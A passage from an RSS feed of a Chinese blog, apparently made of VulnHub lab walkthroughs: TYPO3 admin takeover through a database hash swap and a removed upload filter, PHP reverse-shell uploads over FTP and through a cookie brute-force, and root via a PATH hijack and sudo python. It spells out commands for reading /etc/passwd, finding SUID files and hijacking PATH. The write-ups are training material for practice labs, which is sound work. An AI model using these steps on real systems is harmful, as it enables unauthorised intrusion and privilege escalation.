在网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==&#34;&gt;https://pypi.org/project/argon2-cffi/&lt;/span&gt; 上看到了 argron2 的生成教程&lt;br&gt;
通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-680.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 pip 来安装 argon： &lt;code&gt;python3 -m pip install argon2-cffi&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-681.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开python的命令行，依次输入以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from argon2 import PasswordHasher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ph = PasswordHasher()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash = ph.hash(&amp;quot;typo&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hash)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-682.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打印出来的即为密码为 typo 的 argon 算法之后的加密字符:&lt;br&gt;
 &lt;code&gt;$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-683.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 现在就有了一个用户名密码分别为 admin:typo 的组合&lt;/p&gt;
&lt;p&gt;但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-684.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）&lt;br&gt;
用 admin：typo 进入此后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-685.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了后台地址&lt;/p&gt;
&lt;h3 id=&#34;修改过滤规则上传木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改过滤规则上传木马&#34;&gt;#&lt;/a&gt; 修改过滤规则上传木马&lt;/h3&gt;
&lt;p&gt;进入后台之后看到是一个普通的后台管理地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-686.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-687.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-688.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-689.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：&lt;br&gt;
 &lt;code&gt;\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-690.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将原有的过滤规则全部清除&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-691.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确定之后，接下来文件上传将不会受到任何限制&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-692.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次尝试上传 shell.php 就上传成功了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-693.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-694.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-695.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用一些命令将终端变为一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-696.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep www&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;判断出来没有其他的用户，需要直接拿到 root 的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-697.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-698.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现没有任何任务被加载&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否有设置错误的s权限的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-699.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到一个 apache2-restart&lt;/p&gt;
&lt;h3 id=&#34;文件权限设置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件权限设置错误提权&#34;&gt;#&lt;/a&gt; 文件权限设置错误提权&lt;/h3&gt;
&lt;p&gt;很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-700.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过修改环境变量提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp/:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/local/apache2-restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-701.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/124%20HACKABLELL/</guid>
            <title>VULNHUB 24 HACKABLELL</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/124%20HACKABLELL/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
get CALL.html&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
 &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
 &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/130%20MOMENTUM2/</guid>
            <title>VULNHUB 30 MOMENTUM2</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/130%20MOMENTUM2/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbW9tZW50dW0tMiw3MDIv&#34;&gt;https://www.vulnhub.com/entry/momentum-2,702/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F3d2VnZ2ZlL2FydGljbGUvZGV0YWlscy8xMTkzMjAwNDU=&#34;&gt;https://blog.csdn.net/qwweggfe/article/details/119320045&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 MOMENTUM2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt; &lt;br&gt;
 这次又换了个场所进行测试，所以识别到的 ip 就比较多了，通过 MAC 地址，可确定虚拟在 win 宿主机上的靶机地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-757.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.17&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.17&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-758.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc=&#34;&gt;http://192.168.31.17&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-759.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击检查源代码，看能不能有所发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-760.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么敏感的信息，就去爆破一波目录，还是用 gobuster 工具，指定后缀，指定字典式的暴力破解，也可以用 dirsearch 等工具，前提是找到一个比较好的字典&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-761.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了三个敏感的目录，依次访问这几个目录&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvYWpheC5waHAuYmFr&#34;&gt;http://192.168.31.17/ajax.php.bak&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-762.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;敏感数据泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#敏感数据泄露&#34;&gt;#&lt;/a&gt; 敏感数据泄露&lt;/h3&gt;
&lt;p&gt;直接可以下载的一个备份文件，下载下来查看一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-763.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现是一个 php 的备份文件，里边写了一个过滤文件的规则，如果 admin 按照如下设置，并且添加一个大写字母在最后，那么就去判断 post, 中是否有 secure 的字段为 val1d，如果有的话就允许上传 php 文件&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvZGFzaGJvYWQuaHRtbA==&#34;&gt;http://192.168.31.17/dashboad.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-764.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以上传文件，直接上传一个 shell.php 文件是被拒绝的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-765.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续查看第三个敏感网址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvb3dscy8=&#34;&gt;http://192.168.31.17/owls/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-766.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很有可能是上传文件之后的位置，可在这里进行文件的执行&lt;/p&gt;
&lt;p&gt;接下来的思路就是通过备份文件的提示进行 php 上传文件的绕过，在 dashboard.html 界面进行文件的上传，在再 oswl 页面进行文件的执行&lt;/p&gt;
&lt;h3 id=&#34;crunch-生成字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crunch-生成字典&#34;&gt;#&lt;/a&gt; crunch 生成字典&lt;/h3&gt;
&lt;p&gt;先通过 crunch 生成一个从 A-Z 的字典&lt;br&gt;
 &lt;code&gt;crunch 1 1 -t , -o pass.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-767.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将上传文件的数据包拦截下来，并通过 burp 重发数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-768.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;burp-重发数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-重发数据包&#34;&gt;#&lt;/a&gt; burp 重发数据包&lt;/h3&gt;
&lt;p&gt;添加 cookie 字段，与另外一个 post 字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-769.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 cookie 字段中的最后一个字母设置为随机大写字母&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-770.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;加载通过 crunch 生成的字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-771.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;批量发包后发现没有得到有效的上传成功的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-772.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Owls 页面也没有新的后门上传成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-773.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意这个 post 字段有严格的规范，不能有丝毫的错误，这个字段类型和字段内容中间需要一个空行才可以&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-774.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次重发，在 R 处找到了上传成功的 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-775.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且在 owls 页面接收到了上传成功的后门文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-776.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行此后门，在监听端口的地方拿到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-777.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
